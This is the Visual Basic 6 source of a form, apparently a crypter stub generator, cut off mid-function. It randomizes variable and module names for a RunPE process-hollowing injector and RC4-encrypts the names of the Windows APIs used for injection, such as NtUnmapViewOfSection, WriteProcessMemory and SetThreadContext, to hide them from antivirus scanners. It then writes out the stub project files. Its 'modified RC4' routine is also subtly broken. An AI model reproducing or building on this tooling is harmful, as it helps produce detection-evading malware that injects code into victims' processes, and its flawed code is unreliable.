VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "GraphicGen"
   ClientHeight    =   2745
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   1530
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2745
   ScaleWidth      =   1530
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   58
      Left            =   10320
      TabIndex        =   62
      Text            =   "FakeFunction1  Integer"
      Top             =   960
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   57
      Left            =   10320
      TabIndex        =   61
      Text            =   "FakeFunction1 String"
      Top             =   600
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   56
      Left            =   10320
      TabIndex        =   60
      Text            =   "FakeFunction2"
      Top             =   240
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   55
      Left            =   9240
      TabIndex        =   59
      Text            =   "FakeFunction1"
      Top             =   2400
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   54
      Left            =   9240
      TabIndex        =   58
      Text            =   "CONTEXT"
      Top             =   2040
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   53
      Left            =   9240
      TabIndex        =   57
      Text            =   "PROCESS_INFORMATION"
      Top             =   1680
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   52
      Left            =   9240
      TabIndex        =   56
      Text            =   "STARTUPINFO"
      Top             =   1320
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   51
      Left            =   9240
      TabIndex        =   55
      Text            =   "IMAGE_SECTION_HEADER"
      Top             =   960
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   50
      Left            =   9240
      TabIndex        =   54
      Text            =   "IMAGE_NT_HEADERS"
      Top             =   600
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   49
      Left            =   9240
      TabIndex        =   53
      Text            =   "sStr"
      Top             =   240
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   48
      Left            =   8160
      TabIndex        =   52
      Text            =   "Params"
      Top             =   2400
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   47
      Left            =   8160
      TabIndex        =   51
      Text            =   "sMod"
      Top             =   2040
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   46
      Left            =   8160
      TabIndex        =   50
      Text            =   "sLib"
      Top             =   1680
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   45
      Left            =   8160
      TabIndex        =   49
      Text            =   "sVal"
      Top             =   1320
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   44
      Left            =   8160
      TabIndex        =   48
      Text            =   "lPos"
      Top             =   960
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   43
      Left            =   8160
      TabIndex        =   47
      Text            =   "bvASM"
      Top             =   600
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   42
      Left            =   8160
      TabIndex        =   46
      Text            =   "GetModuleFileNameA"
      Top             =   240
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   41
      Left            =   7080
      TabIndex        =   45
      Text            =   "ThisExe()"
      Top             =   2400
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   40
      Left            =   7080
      TabIndex        =   44
      Text            =   "StrToBytArray"
      Top             =   2040
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   39
      Left            =   7080
      TabIndex        =   43
      Text            =   "Pi"
      Top             =   1680
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   38
      Left            =   7080
      TabIndex        =   42
      Text            =   "Si"
      Top             =   1320
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   37
      Left            =   7080
      TabIndex        =   41
      Text            =   "IMAGE_OPTIONAL_HEADER"
      Top             =   960
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   36
      Left            =   7080
      TabIndex        =   40
      Text            =   "IMAGE_FILE_HEADER"
      Top             =   600
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   35
      Left            =   7080
      TabIndex        =   39
      Text            =   "IMAGE_DOS_HEADER"
      Top             =   240
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   34
      Left            =   6000
      TabIndex        =   36
      Text            =   "Ctx"
      Top             =   2400
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   33
      Left            =   6000
      TabIndex        =   35
      Text            =   "Pish"
      Top             =   2040
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   32
      Left            =   6000
      TabIndex        =   34
      Text            =   "Pinh"
      Top             =   1680
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   31
      Left            =   6000
      TabIndex        =   33
      Text            =   "Pidh"
      Top             =   1320
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   30
      Left            =   6000
      TabIndex        =   32
      Text            =   "parameter"
      Top             =   960
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   29
      Left            =   6000
      TabIndex        =   31
      Text            =   "bvBuff"
      Top             =   600
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   28
      Left            =   6000
      TabIndex        =   30
      Text            =   "sHost"
      Top             =   240
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   27
      Left            =   4920
      TabIndex        =   29
      Text            =   "Inject"
      Top             =   2400
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   26
      Left            =   4920
      TabIndex        =   28
      Text            =   "CallApiByName"
      Top             =   2040
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   25
      Left            =   4920
      TabIndex        =   27
      Text            =   "RunPE Name"
      Top             =   1680
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   24
      Left            =   4920
      TabIndex        =   26
      Text            =   "key"
      Top             =   1320
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   23
      Left            =   4920
      TabIndex        =   25
      Text            =   "kernel32"
      Top             =   960
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   22
      Left            =   4920
      TabIndex        =   24
      Text            =   "ResumeThread"
      Top             =   600
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   21
      Left            =   4920
      TabIndex        =   23
      Text            =   "SetThreadContext"
      Top             =   240
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   20
      Left            =   3840
      TabIndex        =   22
      Text            =   "GetThreadContext"
      Top             =   2400
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   19
      Left            =   3840
      TabIndex        =   21
      Text            =   "WriteProcessMemory"
      Top             =   2040
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   18
      Left            =   3840
      TabIndex        =   20
      Text            =   "VirtualAllocEx"
      Top             =   1680
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   17
      Left            =   3840
      TabIndex        =   19
      Text            =   "NtUnmapViewOfSection"
      Top             =   1320
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   16
      Left            =   3840
      TabIndex        =   18
      Text            =   "ntdll"
      Top             =   960
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   15
      Left            =   3840
      TabIndex        =   17
      Text            =   "RtlMoveMemory"
      Top             =   600
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   14
      Left            =   3840
      TabIndex        =   16
      Text            =   "Text1"
      Top             =   240
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   13
      Left            =   2760
      TabIndex        =   15
      Text            =   "Text1"
      Top             =   2400
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   12
      Left            =   2760
      TabIndex        =   14
      Text            =   "Text1"
      Top             =   2040
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   11
      Left            =   2760
      TabIndex        =   13
      Text            =   "Text1"
      Top             =   1680
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   10
      Left            =   2760
      TabIndex        =   12
      Text            =   "Text1"
      Top             =   1320
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   9
      Left            =   2760
      TabIndex        =   11
      Text            =   "Text1"
      Top             =   960
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   8
      Left            =   2760
      TabIndex        =   10
      Text            =   "Text1"
      Top             =   600
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   7
      Left            =   2760
      TabIndex        =   9
      Text            =   "Text1"
      Top             =   240
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   6
      Left            =   1680
      TabIndex        =   8
      Text            =   "No use atm"
      Top             =   2400
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   5
      Left            =   120
      TabIndex        =   7
      Text            =   "Text1"
      Top             =   1080
      Width           =   1335
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   4
      Left            =   120
      TabIndex        =   6
      Text            =   "Text1"
      Top             =   1800
      Width           =   1335
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   3
      Left            =   1680
      TabIndex        =   5
      Text            =   "Text1"
      Top             =   1320
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   2
      Left            =   1680
      TabIndex        =   4
      Text            =   "Text1"
      Top             =   960
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   1
      Left            =   1680
      TabIndex        =   3
      Text            =   "Text1"
      Top             =   600
      Width           =   975
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Randomize"
      Height          =   375
      Left            =   120
      TabIndex        =   2
      Top             =   240
      Width           =   1335
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   0
      Left            =   1680
      TabIndex        =   1
      Text            =   "Text1"
      Top             =   240
      Width           =   975
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Generate"
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Top             =   2280
      Width           =   1335
   End
   Begin VB.Label Label2 
      Caption         =   "Delimiter:"
      Height          =   255
      Left            =   120
      TabIndex        =   38
      Top             =   1560
      Width           =   735
   End
   Begin VB.Label Label1 
      Caption         =   "Key:"
      Height          =   255
      Left            =   120
      TabIndex        =   37
      Top             =   840
      Width           =   735
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Command1_Click()

Open App.Path & "\Generated\" & Text1(3).Text & ".bas" For Binary As #1
Put #1, , MainModule & vbNewLine & Encryption & vbNewLine & CallApiByName
Close #1

Open App.Path & "\Generated\" & Text1(7).Text & ".vbp" For Binary As #1
Put #1, , ProjectFile
Close #1

Open App.Path & "\Generated\" & Text1(25).Text & ".bas" For Binary As #1
Put #1, , RunPE
Close #1

Open App.Path & "\Generated\" & "settings-" & Text1(7).Text & ".ini" For Binary As #1
Put #1, , "Key: " & Text1(5).Text & vbNewLine & "Delimiter: " & Text1(4).Text
Close #1

End Sub

Public Function RandomLetter() As String
  RandomLetter = ""
  Dim Keyset As String
  Keyset = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
Anfang:
  Randomize
  var1 = Int(26 * Rnd)
  If var1 = 0 Then GoTo Anfang
  RandomLetter = Mid(Keyset, var1, 1)
End Function
Public Function RandomNumber() As String
  RandomNumber = ""
als:
  Randomize
  var1 = Int(9 * Rnd)
  RandomNumber = var1
If RandomNumber = "0" Then GoTo als
End Function

Public Function RC4(ByVal Data As String, ByVal Password As String) As String ' This is a Modified RC4 Function ^^
On Error Resume Next
Dim F(0 To 255) As Integer, X, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For X = 0 To 255
    Y = (Y + F(X) + Key(X Mod Len(Password))) Mod 256
    F(X) = X
Next X
Key() = StrConv(Data, vbFromUnicode)
For X = 0 To Len(Data)
    Y = (Y + F(Y) + 1) Mod 256
    Key(X) = Key(X) Xor F(Temp + F((Y + F(Y)) Mod 254))
Next X
RC4 = StrConv(Key, vbUnicode)
End Function

Private Sub Command2_Click()
Text1(0).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'MEX (Open #1)
Text1(1).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber  'Data (Stores #1 Data)
Text1(2).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber  'Delimiter (Splits Data)
Text1(3).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber  'Module Name
Text1(4).Text = "[" & lRan(RandomNumber) & RandomLetter & lRan(RandomNumber) & RandomLetter & RandomLetter & lRan(RandomNumber) & RandomLetter & RandomLetter & lRan(RandomNumber) & RandomLetter & RandomLetter & lRan(RandomNumber) & RandomLetter & RandomNumber & RandomLetter & RandomNumber & RandomLetter & RandomNumber & RandomLetter & RandomNumber & RandomLetter & RandomNumber & RandomLetter & RandomNumber & RandomLetter & RandomNumber & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) & "]"
Text1(5).Text = RandomLetter & RandomLetter & lRan(RandomNumber) & RandomLetter & RandomLetter & lRan(RandomNumber) & RandomLetter & RandomLetter & lRan(RandomNumber) & RandomLetter & RandomLetter & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) 'Encryption key
Text1(7).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'Project file name
Text1(8).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'RC4
Text1(9).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'RC4 Function - Data
Text1(10).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'RC4 Function - Password
Text1(11).Text = RandomLetter & RandomLetter & RandomLetter 'RC4 Function - F
Text1(12).Text = RandomLetter & RandomLetter & RandomLetter 'RC4 Function - X
Text1(13).Text = RandomLetter & RandomLetter & RandomLetter 'RC4 Function - Y
Text1(14).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter 'RC4 Function - Key
Text1(24).Text = RandomNumber & RandomLetter & RandomNumber & RandomLetter & RandomNumber 'Encryption key
Dim Pass As String
Pass = Text1(24).Text
Text1(15).Text = RC4(Text1(15).Text, Text1(24).Text) 'Encrypt RtlMoveMemory
Text1(16).Text = RC4(Text1(16).Text, Text1(24).Text) 'Encrypt ntdll
Text1(17).Text = RC4(Text1(17).Text, Text1(24).Text) 'Encrypt NtUnmapViewOfSection
Text1(18).Text = RC4(Text1(18).Text, Text1(24).Text) 'Encrypt VirtualAllocEx
Text1(19).Text = RC4(Text1(19).Text, Text1(24).Text) 'Encrypt WriteProcessMemory
Text1(20).Text = RC4(Text1(20).Text, Text1(24).Text) 'Encrypt GetThreadContext
Text1(21).Text = RC4(Text1(21).Text, Text1(24).Text) 'Encrypt SetThreadContext
Text1(22).Text = RC4(Text1(22).Text, Text1(24).Text) 'Encrypt ResumeThread
Text1(23).Text = RC4(Text1(23).Text, Text1(24).Text) 'Encrypt Kernel32
Text1(42).Text = RC4(Text1(42).Text, Text1(24).Text) 'Encrypt GetModuleFileNameA
Text1(25).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'RunPE ModuleName
Text1(26).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'CallApiByName
Text1(27).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'Inject
Text1(28).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'sHost
Text1(29).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'bvBuff
Text1(30).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'parameter
Text1(31).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'Pidh
Text1(32).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'Pinh
Text1(33).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'Pish
Text1(34).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'ctx
Text1(35).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'IMAGE_DOS_HEADER
Text1(36).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'IMAGE_FILE_HEADER
Text1(37).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'IMAGE_OPTIONAL_HEADER
Text1(38).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'Si
Text1(39).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'Pi
Text1(40).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(41).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(42).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(43).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(44).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(45).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(46).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(47).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(48).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(49).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(50).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(51).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(52).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(53).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(54).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(55).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(56).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(57).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray
Text1(58).Text = RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber 'StrToBytArray

End Sub

Public Function lRan(chs As String)
  Dim num_characters As Integer
  Dim i As Integer
  Dim txt As String
  Dim ch As Integer
  Randomize
  num_characters = CInt(chs)
  For i = 1 To num_characters
  ch = Int((26 + 26 + 10) * Rnd)
  If ch < 26 Then
  txt = txt & Chr$(ch + Asc("A"))
  ElseIf ch < 2 * 26 Then
  ch = ch - 26
